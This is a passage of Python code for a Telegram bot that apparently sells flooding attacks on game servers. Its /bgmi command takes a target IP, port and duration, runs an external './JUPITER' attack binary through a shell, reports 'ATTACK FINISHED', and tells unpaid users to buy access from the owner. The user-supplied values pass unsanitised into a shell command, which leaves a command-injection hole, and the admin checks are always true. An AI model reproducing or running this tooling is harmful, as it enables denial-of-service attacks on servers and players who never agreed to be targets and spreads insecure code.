                response = "⏳ 5 - 𝙨𝙚𝙘𝙤𝙣𝙙 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣 𝙞𝙨 𝙣𝙤𝙬 𝙖𝙥𝙥𝙡𝙞𝙚𝙙!\n🔄 𝙒𝙖𝙞𝙩 𝙖𝙣𝙙 𝙜𝙖𝙩𝙚 𝙩𝙝𝙚 𝙢𝙤𝙢𝙚𝙣𝙩\n⏳ 𝙀𝙣𝙟𝙤𝙮 𝙩𝙝𝙚 𝙚𝙣𝙙𝙡𝙚𝙫𝙤𝙧 𝙧𝙞𝙙𝙚!\n\nᴅᴇᴠᴇʟᴏᴘᴇʀ :--> @ᴍʀ_ᴀʀᴍᴀɴ_ᴏᴡɴᴇʀ"
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 300:
                response = "⚠️ 𝙀𝙧𝙧𝙤𝙧: 𝙏𝙞𝙢𝙚 𝙞𝙣𝙩𝙚𝙧𝙫𝙖𝙡 𝙢𝙪𝙨𝙩 𝙗𝙚 𝙡𝙚𝙨𝙨 𝙩𝙝𝙖𝙣 300.\n🔍 𝘾𝙝𝙚𝙘𝙠 𝙮𝙤𝙪𝙧 𝙞𝙣𝙥𝙪𝙩 𝙖𝙣𝙙 𝙬𝙚𝙡𝙡 𝙖𝙙𝙟𝙪𝙨𝙩 𝙩𝙝𝙚 𝙝𝙖𝙣𝙙𝙡𝙚𝙙 𝙩𝙞𝙢𝙚.\n✔️ 𝘿𝙤𝙣'𝙩 𝙝𝙚𝙨𝙞𝙩𝙖𝙩𝙚 𝙩𝙤 𝙨𝙚𝙚 𝙚𝙓𝙥𝙚𝙧𝙩 𝙞𝙣𝙛𝙤 𝙛𝙤𝙧 𝙬𝙤𝙧𝙠𝙨𝙝𝙤𝙥𝙨.."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./JUPITER {target} {port} {time}"
                # Run the external command
                process = subprocess.run(full_command, shell=True)
                # Handle the response
                response = f"⚠️ 𝙏𝘼𝙍𝙂𝙀𝙏 𝘿𝙀𝙏𝘼𝙄𝙇𝙎 ⚠️\n\n✅ 𝘼𝙏𝙏𝘼𝘾𝙆 𝙁𝙄𝙉𝙄𝙎𝙃𝙀𝘿\n🔍 𝙏𝘼𝙍𝙂𝙀𝙏: {target}\n🔌 𝙋𝙊𝙍𝙏: {port}\n\n🕒 𝙏𝙄𝙈𝙀: {time}\n\n🔥 𝙇𝙚𝙩 𝙩𝙝𝙚 𝙘𝙝𝙖𝙤𝙨 𝙪𝙣𝙛𝙤𝙡𝙙. 𝙀𝙫𝙚𝙧𝙮 𝙘𝙡𝙤𝙪𝙙 𝙤𝙛 𝙙𝙚𝙨𝙤𝙡𝙖𝙩𝙞𝙤𝙣 𝙣𝙤𝙬 𝙙𝙖𝙧𝙠𝙚𝙣𝙨\n\n💥 𝙂𝙞𝙫𝙚 𝙣𝙤 𝙫𝙤𝙞𝙘𝙚 𝙩𝙤 𝙨𝙩𝙧𝙞𝙭 𝙛𝙤𝙧 𝙡𝙞𝙣𝙪𝙨! 🚨 𝘿𝙞𝙎𝘾𝙊𝙉𝙏𝙀𝙉𝙏 🏴‍☠️\n\n👁️ 𝙒𝘼𝙏𝘾𝙃 𝙤𝙪𝙩 𝙛𝙤𝙧 𝙧𝙚𝙩𝙡𝙖𝙩𝙞𝙤𝙣𝙨! 𝙏𝙝𝙚 𝙟𝙤𝙪𝙧𝙣𝙖𝙡 𝙤𝙛 𝙖𝙣𝙖𝙧𝙘𝙝𝙮 𝙝𝙖𝙨 𝙗𝙚𝙜𝙪𝙣."
                bot.send_message(message.chat.id, "SEND FEEDBACK 😡")
        else:
            response = "💠 𝗣𝗟𝗔𝗡 𝟮 𝗔𝗧𝗧𝗔𝗖𝗞 𝗗𝗘𝗧𝗔𝗜𝗟𝗦 💠\n\n✅ 𝗨𝗦𝗔𝗚𝗘 :- /𝗯𝗴𝗺𝗶 < 𝗜𝗣 > < 𝗣𝗢𝗥𝗧 > < 𝗧𝗜𝗠𝗘 >\n𝗘𝗫𝗔𝗠𝗣𝗟𝗘 :- /𝗯𝗴𝗺𝗶 𝟮𝟬.𝟬.𝟬 𝟴𝟳𝟬𝟬 𝟭𝟮𝟬\n\n❗️ USE RESPONSIBLY!\n\nᴛʜɪ𝙨 ʙᴏᴛ ᴏᴡɴᴇʀ ❤️‍🩹:--> @ᴍʀ_ᴀʀᴍᴀɴ_ᴏᴡɴᴇʀ"  # Updated command syntax
    else:
        response = ("🚫 UNAUTHORIZED ACCESS! 🚫\n\nNoops! It seems like you don't have permission to use the /attack command. To gain access and unleash the power of attacks, you can:\n\n🔑 VERIFY YOUR PERMISSIONS\n📝 REQUEST ACCESS FROM AN ADMIN\n\n📞 IF YOU STILL NEED HELP, CONTACT SUPPORT.ꜱ!\n\n𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 @MR_ARMAN_OWNER")
        bot.send_message(message.chat.id, "DM TO BUY ACCES :- @MR_ARMAN_OWNER ✅")
    bot.reply_to(message, response)


@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or owner_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "USERS are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "users Cleared Successfully ✅"
        except FileNotFoundError:
            response = "users are already cleared ❌."
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)
 

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or owner_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This # Function to handle the main menu"


# Start the bot
bot.polling()

